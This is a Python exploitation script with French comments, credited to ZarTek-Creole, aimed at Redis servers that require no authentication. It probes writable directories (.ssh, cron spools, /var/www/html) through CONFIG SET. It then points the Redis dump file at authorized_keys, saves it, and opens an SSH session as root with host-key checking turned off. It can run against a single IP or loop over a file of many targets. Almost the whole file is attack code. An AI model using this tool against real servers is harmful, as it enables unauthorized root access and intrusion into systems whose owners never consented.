#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nom du code : Gestionnaire de serveurs Redis non authentifiés
Description : Ce code exploite les serveurs Redis non authentifiés pour la sécurité par Zartek-creole.
Auteur      : ZarTek-Creole (https://github.com/ZarTek-Creole)
Date        : 06-12-23
Source      :
        - https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
        - http://antirez.com/news/96
        - https://rioasmara.com/2023/04/07/redis-rce-post-exploitation/
        - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
"""
import argparse
import logging
import os
import subprocess
import sys
from typing import List, Tuple


class RedisConfig:
    CLI_PATH = '/usr/bin/redis-cli'
    CLI_PATH_ALT = '/usr/local/bin/redis-cli'
    DEFAULT_PORT = '6379'
    DEFAULT_USER = 'root'
    DEFAULT_SSH_KEY = 'id_ed25519.pub'
    DEFAULT_TIMEOUT = 30


class ExitOnErrorHandler(logging.StreamHandler):
    def emit(self, record):
        if record.levelno >= logging.ERROR:
            super().emit(record)
            sys.exit(1)


def configure_logging(verbose: bool):
    """
    Configure le système de logging.

    Args:
        verbose (bool): Si True, le niveau de logging est défini sur DEBUG, sinon sur INFO.
    """
    logging.basicConfig(
        format="%(asctime)s - %(levelname)s - %(message)s",
        level=logging.DEBUG if verbose else logging.INFO,
        handlers=[ExitOnErrorHandler()]  # Utilisation du gestionnaire personnalisé
    )


class RedisServerManager:
    def __init__(self, ipAddress: str, port: str = RedisConfig.DEFAULT_PORT, user: str = RedisConfig.DEFAULT_USER, sshKey: str = RedisConfig.DEFAULT_SSH_KEY, timeout: int = RedisConfig.DEFAULT_TIMEOUT):
        """
        Initialise un gestionnaire de serveur Redis.

        Args:
            ipAddress (str): L'adresse IP du serveur Redis.
            port (str): Le port Redis à utiliser (par défaut : 6379).
            user (str): L'utilisateur SSH pour la connexion (par défaut : root).
            sshKey (str): Le chemin vers la clé SSH (par défaut : id_rsa).
            timeout (int): Le délai d'attente en secondes pour les commandes (par défaut : 30).
        """
        self.ipAddress = ipAddress
        self.port = port
        self.user = user
        self.sshKey = sshKey
        self.sshKeyPrivate = self.sshKey.rstrip('.pub')
        self.timeout = timeout
        self.dbFilename = "authorized_keys"
        self.directoryPath = self._determineDirectoryPath()
        self.commands = self._generateCommands()
        self.binaryRedis = ''
        ssh_key_exists, ssh_key_message = self._CheckBinary()
        if not ssh_key_exists:
            logging.error(ssh_key_message)

    def _CheckBinary(self) -> tuple[bool, str]:
        """
        Vérifie la disponibilité d'un binaire spécifié et, éventuellement, d'un client SSH.

        Args:
            binaryPath (str): Le chemin vers le binaire à vérifier.
            sshKey (str, optionnel): Le chemin vers la clé SSH (si nécessaire).

        Returns:
            tuple[bool, str]: Un tuple contenant True si le binaire et, le cas échéant, le binaire SSH existent,
                            et une chaîne de caractères (msg) décrivant le résultat.
        """
        sshKey_exists = os.path.isfile(self.sshKey)
        if not sshKey_exists:
            return False, f"La clé public SSH '{self.sshKey}' n'existe pas. Assurez-vous d'avoir fourni le bon chemin. pour generer une clé ssh : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"
        sshKeyPrivate_exists = os.path.isfile(self.sshKeyPrivate)
        if not sshKeyPrivate_exists:
            return False, f"La clé privée SSH '{self.sshKeyPrivate}' n'existe pas. Assurez-vous d'avoir fourni le bon chemin. pour generer une clé ssh : ssh-keygen -t ed25519 -f ./id_ed25519 -N ''"

        try:
            subprocess.run(["ssh", "-V"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError:
            return False, "Le client SSH n'est pas installé sur votre système. Assurez-vous d'avoir installé un client SSH compatible. (apt install openssh-client)"
        if os.path.isfile(RedisConfig.CLI_PATH):
            self.binaryRedis = RedisConfig.CLI_PATH
        elif os.path.isfile(RedisConfig.CLI_PATH_ALT):
            self.binaryRedis = RedisConfig.CLI_PATH_ALT
        else:
            return False, "Le client Redis n'est pas installé sur votre système. Assurez-vous d'avoir installé un client Redis compatible. (apt install redis-tools)"
        return True, "Tout est bon."

    def _determineDirectoryPath(self) -> str:
        """
        Détermine le chemin du répertoire .ssh en fonction de l'utilisateur.

        Returns:
            str: Le chemin du répertoire .ssh.
        """
        return f'/home/{self.user}/.ssh/' if self.user != "root" else '/root/.ssh/'

    def _generateCommands(self) -> List[List[str]]:
        """
        Génère les commandes Redis nécessaires.

        Returns:
            List[List[str]]: Une liste de listes contenant les commandes Redis.
        """
        return [
            ['redis-cli', '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dbfilename', 'backup.db'],
            ['redis-cli', '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dir', self.directoryPath],
            ['redis-cli', '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dbfilename', self.dbFilename],
            ['redis-cli', '-h', self.ipAddress, '-p', self.port, 'save']
        ]

    def processServer(self) -> Tuple[bool, str]:
        """
        Exécute le processus de gestion du serveur Redis.

        Returns:
            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
        """
        logging.info(f"Tentative sur {self.ipAddress}:{self.port} avec {self.user} et la clé SSH '{self.sshKey}' (timeout {self.timeout} sec) écriture dans {self.directoryPath}{self.dbFilename}")
        success, msg = self._findVulnerableDirectory()
        if not success:
            return False, msg
        for command in self.commands:
            success, message = self._executeCommand(command)
            if not success:
                return False, message
        return self._executeSSHCommand()

    def _findVulnerableDirectory(self) -> Tuple[bool, str]:
        """
        Trouve un répertoire vulnérable pour Redis.

        Returns:
            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
        """
        for dname in [
            "/var/www/html",
            "/home/redis/.ssh",
            "/var/lib/redis/.ssh",
            "/var/spool/cron/crontabs",
            "/var/spool/cron",
        ]:

            command = ['redis-cli', '-h', self.ipAddress, '-p', self.port, 'config', 'set', 'dir', dname]
            success, _ = self._executeCommand(command)
            if success:
                self.directoryPath = dname
                return True, dname
        return False, "Aucun répertoire vulnérable trouvé."

    def _executeCommand(self, command: List[str]) -> Tuple[bool, str]:
        """
        Exécute une commande shell.

        Args:
            command (List[str]): La commande à exécuter sous forme de liste de chaînes.

        Returns:
            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
        """

        try:
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout, text=True)
            return self._checkRedisResult(result, command)
        except subprocess.TimeoutExpired:
            return False, f"La commande a expiré après {self.timeout} secondes."
        except Exception as e:
            return False, f"Erreur : {str(e)}"

    def _checkRedisResult(self, result: subprocess.CompletedProcess, command: List[str]) -> Tuple[bool, str]:
        """
        Vérifie le résultat de l'exécution d'une commande Redis.

        Args:
            result (subprocess.CompletedProcess): Le résultat de l'exécution de la commande.
            command (List[str]): La commande qui a été exécutée.

        Returns:
            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
        """
        error_msg = result.stderr.strip()
        result_msg = result.stdout.strip()
        return_code = result.returncode

        if "NOAUTH Authentication required" in result_msg:
            return False, "Authentification requise."
        elif "Server closed the connection" in error_msg or "Connection reset by peer" in error_msg:
            return False, "Connexion interrompue."
        elif return_code != 0:
            return False, "Erreur inconnue."
        return True, "Commande exécutée avec succès."

    def _executeSSHCommand(self) -> Tuple[bool, str]:
        """
        Exécute la commande SSH pour se connecter au serveur.

        Returns:
            Tuple[bool, str]: Un tuple contenant un booléen (True si réussi, False sinon) et un message.
        """
        sshCommand = f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout={self.timeout} -o PasswordAuthentication=no -i {self.sshKey} {self.user}@{self.ipAddress}"
        try:
            os.system(sshCommand)
            return True, "Commande SSH exécutée."
        except Exception as e:
            return False, f"Erreur de connexion SSH : {str(e)}"


def processFile(filePath: str, port: str, user: str, sshKey: str, timeout: int):
    """
    Traite un fichier contenant des adresses IP de serveurs Redis.

    Args:
        filePath (str): Le chemin du fichier contenant les adresses IP.
        port (str): Le port Redis à utiliser.
        user (str): L'utilisateur SSH pour la connexion.
        sshKey (str): Le chemin vers la clé SSH.
        timeout (int): Le délai d'attente en secondes pour les commandes.
    """
    with open(filePath, "r") as file:
        for ipAddress in file:
            ipAddress = ipAddress.strip()
            if ipAddress:
                manager = RedisServerManager(ipAddress, port, user, sshKey, timeout)
                manager.processServer()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Gestionnaire de serveurs Redis non authentifiés",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    parser.add_argument('--ip', help="Adresse IP du serveur Redis")
    parser.add_argument('-f', '--file', help="Chemin vers le fichier contenant les adresses IP")

    parser.add_argument('--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
    parser.add_argument('--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur pour la connexion Redis")
    parser.add_argument('--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin vers le fichier de clé SSH")
    parser.add_argument('--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Timeout pour la connexion")
    parser.add_argument('-v', '--verbose', action='store_true', help="Augmente la verbosité des logs")

    args = parser.parse_args()

    # Configuration du logging
    configure_logging(args.verbose)

    # Utilisation des valeurs fournies par l'utilisateur ou des valeurs par défaut
    ip_address = args.ip
    file_path = args.file
    port = args.port
    user = args.user
    sshKey = args.sshKey
    timeout = args.timeout

    if not (ip_address or file_path):
        logging.warning("Aucune adresse IP ou chemin de fichier spécifié. "
                        "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
                        "'-f' pour spécifier un fichier contenant des adresses IP. "
                        "Utilisez '--help' pour plus d'informations.")
    elif ip_address:
        manager = RedisServerManager(ip_address, args.port, args.user, args.sshKey, args.timeout)
        manager.processServer()
    else:
        processFile(file_path, args.port, args.user, args.sshKey, args.timeout)
